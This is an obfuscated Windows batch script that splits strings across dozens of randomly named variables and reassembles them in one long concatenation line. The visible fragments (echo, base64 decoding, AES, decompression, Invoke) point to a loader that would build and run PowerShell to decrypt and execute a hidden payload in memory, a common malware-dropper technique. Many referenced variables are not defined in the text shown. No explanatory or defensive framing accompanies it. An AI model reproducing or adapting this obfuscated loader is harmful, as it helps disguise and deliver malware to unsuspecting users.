@echo off
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "aMFWxMmgrk=pUex"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "tgTlgdRRrE=v1.0"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "cFCEivbPsp=_var"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "lYtVyNTJYg=phy."
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "vxJoDWzNQk=stin"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "jVArtorSRR=comp"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "HhBluiLWih=ecut"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "OBMmToXvFC=$dec"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "pUgePjLRew=$RpU"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "BOsakfyXjY=_var"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "kSanjFMMHB=ram2"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "dRymgbtjPl=func"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "IeuKoNVVJz=e('@"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "jNjMQCZJwX=_var"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "qzFQSZueaG=or()"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "tDPkNbPtUc=Stre"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "dsmkQoliuz=_fun"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "rUfxVTHQSk=echo"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "vRHDymYirs=ss_f"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "KkkkvwmyAP=ecur"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "eTsBMtshpf=ion."
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "NzIDxpOjId=$ubI"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "xcmeKxxOsX=ress"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "EmvPDnUtZL=Invo"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "HIDkezCaQy=)};$"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "JIXWbpNPzw=[Con"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "FgAyLiWaah=var."
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "xVbbKnXdQT=ad2_"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "thNyYaZtCH=yste"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "eMKLnAgdbz=ke($"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "ZyftqLxVWm=ompr"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "NgytRXMQKH=l;ex"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "NyUralIJpZ=ent_"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "yhGziZaxJv=ion "
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "FqoisDauew=ase6"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "ljbxQBDMlH=exe""
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "kFRwGuZJir=e[]]"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "uyAbzuACwA=.Aes"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "bMzqyWGiIY=ctio"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "axZuZFeyvR=;$we"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "qgEeTbYoYY=de]:"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "CdgUNyjVIa=curi"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "KtLGHbhJRJ=_var"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "YyZTbkjweM=ompr"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "SAUqfyJZwn=on.C"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "xDaVMdjYJI=mFin"
%rUfxVTHQSk%%QxDJiZKdVd%%tXlhwqTyqF%%uwyEKCLYLw%%YiLTPZmDtT%%DirntuJYbF%%ZjzmPuZZYG%%oMsyeklsrw%%dpexbmellq%%SNWfwPIydv%%anFMERQTii%%irGECJeclD%%qNNHOBPmbp%%CMoWwQKsSj%%vlcdhBgsDM%%LGnAfmzXYd%%cDRTFwdKhL%%ZLjbheKJAm%%vxJoDWzNQk%%qNtPhStjxL%%yvkRNZwlsa%%BQxLHEUCpJ%%XpUXvmsuUp%%LBmOOanSBE%%znuQIApHhD%%YQUOOiBmvB%%GcrdpaDIXH%%rbbKkJUdpV%%WKmrqUGyaF%%zawZXwWrBH%%WHJzlWPjDe%%oxWzFVQaMu%%tfIsiqFbMO%%NCCIZoaMfu%%ewUVqbdWuc%%FWEgnQYrrU%%rNxPqLUoAq%%UdUsqXlMbg%%nIHKiRYwuj%%qJvldqZfEF%%hPwehBbmPq%%ElqkHIgMGz%%NyUralIJpZ%%XghwZymCDG%%PMGdEeskDu%%knyfRIUeeV%%TsXQtyeUkj%%vEiZJaRQNV%%TxfUPJHcEq%%DiyINxPPKf%%axZuZFeyvR%%RdribvmcbJ%%RbqUFnfAmm%%lbgHVvxLVj%%FiHNzAQpGs%%lMOaoYhfOL%%ADmjFPWJnF%%XAhSeJuDuf%%xPUUazngtW%%osWjIbVxhK%%DgcauKEWWE%%EDLJoKJsig%%BQqqrFEYjc%%NWwKCqNTzq%%UrjOrLGnVY%%rDpbiMQMJP%%gGMTRIhbgY%%XQTSmkHBYG%%YqckLkHuBQ%%zakKjnEpXJ%%DFgWbBKwOX%%fpNdQPDBiH%%bMzqyWGiIY%%FrEpctjfjk%%AkGELkngTt%%JdhqIQfQye%%VBNPrNKyaw%%GyrYgQgVFo%%JzpopCjoHl%%otHfpYxQmX%%zPgxNlLjjS%%KkkkvwmyAP%%DwRPimQmJh%%tqJIOUsSBe%%RafOBeixKS%%MYpwtdYqoB%%uyAbzuACwA%%duXwXDrcoe%%dtCQvuamoK%%WcDaJtAdpg%%DGbjPsbTzQ%%MVckxbWKGe%%tonLEbQXME%%dnMhBxssac%%thNyYaZtCH%%wQxlNpsqEO%%CdgUNyjVIa%%JDJDLmBPME%%bxuehmPAum%%ecOlApaSKA%%QeKCYTgTAA%%NCDZNeJbMA%%IIAwVHPxdv%%lIfmOXMSgo%%gWaTyCyOyv%%GZfkRhDnGr%%dIQeofxrlP%%sQVytMIHYt%%ibZIPmDUuG%%uylPkyfWEs%%ehCJdQdGQf%%zVpnicJipb%%CCWEvTEfnV%%GLcFobyqEZ%%iWdphyjYHh%%PXGDQBkYnj%%lYtVyNTJYg%%EsDqSFzGxX%%JFyggJezPN%%QAcvNkDiRt%%EAaACwuqKl%%cDAqzFzmOP%%IuUlpephCI%%cqPdsiFYDK%%oOPDKmZMVi%%LqucLkGPky%%gmObiMOxXq%%ZBJeAUFqAc%%fDmtXMWNsi%%CQNeEcZNvY%%yCPEijGpCQ%%FqoisDauew%%PbeOOjOEAx%%URUCEDNHlN%%fGlCDlCEMa%%cFIZiwxaQZ%%vbPeVNvLDP%%PsjrqjQClC%%GjSzvpjVuh%%fNRmreRgGP%%PQbWlKvrIY%%GVOnsmjqJF%%EArwJcAXZm%%sJWwNQhWnL%%USmvBkYETf%%UAxalpzFmj%%jyrwGWYsAC%%encYLMoVUz%%dWdUrRmVkx%%qCJeBvAPOF%%lFerbHyzoz%%aDKNfnvxfP%%JdhclBDYwq%%lygpnxRLSJ%%sNGLxNSVYo%%acKZVixcgz%%ezdYnCxvAI%%vJEvwWwwEx%%JIahpiNhue%%ZPFtFSKIxU%%qwuqTqypCY%%MbxIQvzVIe%%PpawIFelQD%%mOYKhmnKoY%%KxEvsYsWDj%%tOZtfawYHn%%mmzYLXdMAD%%hPGJtrLFdJ%%nhIGkyPFFh%%QpcaMxYFJu%%VFvZbDhpZO%%pQUXafETOn%%ixhtNSNFXW%%sfVJOHMIEG%%qzFQSZueaG%%TfRwlxxclj%%QBrdvjVkjs%%tVohXJSqBN%%xIEqdnnzxr%%kJwuQOhCvI%%ejVInXQKyC%%FgAyLiWaah%%VwNRhJyTrj%%BpVSJnNWdf%%xDaVMdjYJI%%RgCnNIwdBE%%yWspbplIOx%%uaXUKrvRfe%%AAkJruMHfa%%RJvyHAkKTw%%SAjlnQjICv%%mEYweYLJXH%%DDDOGKFynk%%gKXJlZqYvB%%kefKNmLYuI%%OBMmToXvFC%%lKusoCGple%%IMnwwyyTau%%ZHeEvFXLQX%%cUtTpAJMvl%%FwNqabnpQu%%QdvkDDFQWI%%EVznbNtugV%%PLxOODUOEu%%sHUvhYyiqM%%UTQNHJXzom%%ISjVEeGHwZ%%JRlCqWbdgd%%okeuaWUKge%%GvAsLzyYRc%%sRMqcdHowL%%ITslXyOOUI%%jVArtorSRR%%xcmeKxxOsX%%oGouwMcovm%%LKdiSwquWN%%MPwFoFHnAz%%aZwXuCHfVH%%lcxEfMZdlo%%gdSElzjIgQ%%ePOVlLogOp%%OlyoBJsSzB%%GEbmtXgRMU%%sYYeCwoBst%%ySoWzVEDcB%%hrjFkANBBo%%FwuTXQmuLf%%vQAfcNpfNy%%tDPkNbPtUc%%JMaeObyvZJ%%JkRXgqQeCw%%lHOdUbHjfV%%bSzJvJQwqb%%pUgePjLRew%%kKQxQbYWjM%%topdIQKhBw%%AuOBhrBJnL%%qPfIKqccTu%%KTmDHaEcwZ%%yDqHWQWopz%%zoIxwEjGtr%%OIogMHhkUg%%MynomNzxMU%%uNMtUwkOhd%%RYJekQojVp%%ILujNbbulI%%eLTyXaWUlq%%wtdRpNOidw%%ypCxmJsDGT%%uQDyYfelhj%%UuXFSpHCTZ%%mSqPkPjwmn%%IsnsVGPFTj%%JDbTBerXEX%%bPJHHCzOni%%WHZTBBgFJm%%zbJJpIRwng%%ylRpmSJFLt%%gbsKnbEhra%%XLnsxagasY%%LcAhKKPKHJ%%SAUqfyJZwn%%eJemjMXzRl%%MInNHdAkZC%%mUzIiwRXnY%%qgEeTbYoYY%%NqSvXjnhIb%%YyZTbkjweM%%UalSVFeiTG%%fmmbPVbeKZ%%iKomaRgKcJ%%RBjldMeZAr%%eencVMlXeg%%ifMeDkMZSd%%yugjPEcbYc%%QbEsUewmqo%%FjGWALPfHT%%afhwTKYemr%%JkZbpgBtjz%%NzIDxpOjId%%OXufcLUhzk%%fsZZEvjEHu%%kwVhgAwEYD%%WPvjCMQUYD%%mtUZtuAJYc%%gjCoSsbmYC%%ppjVoqXPwR%%FpGdhRBVOM%%aMFWxMmgrk%%LEVwoWjYKc%%wKngxQDyga%%QfymCCKnyB%%dRymgbtjPl%%IDlLppzyyG%%jOZqtFfITL%%mWAjYFlbaw%%wtIVsnUMXm%%dlORrpRhSB%%VLqeYLdbMJ%%dyyckQfdYg%%KtLGHbhJRJ%%OeiyBLdEWG%%kSanjFMMHB%%jNjMQCZJwX%%EtkcVZpaAy%%NAgrVRsyxc%%oucqzaUwHZ%%LtiZcQIXrj%%pMliNIGRQZ%%jBluIjrTCU%%eTsBMtshpf%%jugnMCiTCQ%%udFIPkiNqS%%yOvwfvuKwu%%pyCKPPvXHg%%ayrLAboJLC%%kFRwGuZJir%%iyxiAVBUSa%%PlgkSaxJWe%%hKYUjKHfdv%%PLOpYCbikE%%AtRLMZyGEG%%XqMejyzCZP%%nvQxldwQlp%%YpysEOTnhj%%maAxxzZKfA%%cyjuqeCtzJ%%DHvoHISuAv%%EmvPDnUtZL%%eMKLnAgdbz%%lzNxGEFmPP%%HEjKVPctRd%%jjtNFRXJah%%BOsakfyXjY%%HIDkezCaQy%%yMlYpcfZSP%%HWlInSmizP%%qekSvBFjJf%%pWTCJPCtLh%%ZyftqLxVWm%%ntAahtCsCO%%xWqNALdIZy%%pSxrQRZQCK%%eJnwRVvSvp%%nkRWKdirTF%%IOWxWvVikp%%tLQSKNIUVE%%pknJlfbAHN%%JIXWbpNPzw%%amIfWBtYmW%%unwppxAmmR%%uvBwFLOTQu%%aTuyEdChNJ%%McoLtvlHHD%%OBDIcFLlAl%%NzhRVBTXKm%%VtzCfrgPdj%%zgmnGzpMwZ%%rrHBWmVwPS%%CnXvIvbaDK%%yVhqLGnUlw%%lhBLUDMXGS%%wKalHljREk%%xpiLAvkqQp%%YaksGvMlAe%%IeuKoNVVJz%%xwpaYVYQkz%%tvgqTvzHEl%%zXqACtVywN%%AoGrSCLkuL%%xVbbKnXdQT%%onqxZzfPyF%%aztxYfPPxr%%KonTOEWpPo%%vRHDymYirs%%wVLOKXBDcF%%yhGziZaxJv%%DQajjjSQYL%%hGyfUODyiR%%dsmkQoliuz%%mBzWPGVCEB%%eLEqyRJAEu%%wBoRskDQsV%%YJvzzGgCpo%%SaTHMsNWLY%%EKDacKmHEF%%cfjJDvpfQS%%LhlpBvHHfa%%wHeuqnfvxP%%tyXKmNRkdr%%cIfTnxzoyH%%cFCEivbPsp%%pTHbymjAdO%%DwDNXNCkgT%%ORXPMNVtBQ%%LcSOcjadva%%nYkJdGcOHv%%TQIyAxVSpK%%qQZmdBDPLN%%MyPgFQHoMg%%LhMgXUuunE%%niOKKxZYGC%%cmdTIvbCSK%%QHfiYjeSoi%%gjBgzDJfwi%%RIIkeydSxC%%TSBDOGdFLA%%tgJxvSLXte%%LWgKShYVez%%gluMooIYrS%%AdtVOLZkOm%%NgytRXMQKH%%HhBluiLWih%%jMFBEHCkVh%%hOgSMZMbVr%%CRnKksCiBG%%ZcbHcbBXPj%%uBVDzTbJzu%%vKbRFsyVql%%fuJpieMzQK%%yOmLXaWKkr%%rTJgkpakcJ%%CFHDdaSGvv%%gCSOWHxqTE%%wOKYTmKCeS%%eBwgiSgIHW%%iqpPkPaUkD%%RKqxnNVJKR%%ppBCqEfMFd%%APIXwfzVOe%%mQsBatlYSu%%XxYQGSOMyF%%Joogccbtbh%%oZVFFzXaBX%%tgTlgdRRrE%%rMwiuYBlyY%%sSXLgXCslh%%UNlBlDudaZ%%ljbxQBDMlH%
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "qvKvdZJEfe= /b"
!huFiEMaGzaxvCRoxRTqmWodlYiAaQpMsCNEfRfZEMBmuxQrlfM! "GBeEPEZyEG=exit"
%GBeEPEZyEG%%qvKvdZJEfe%
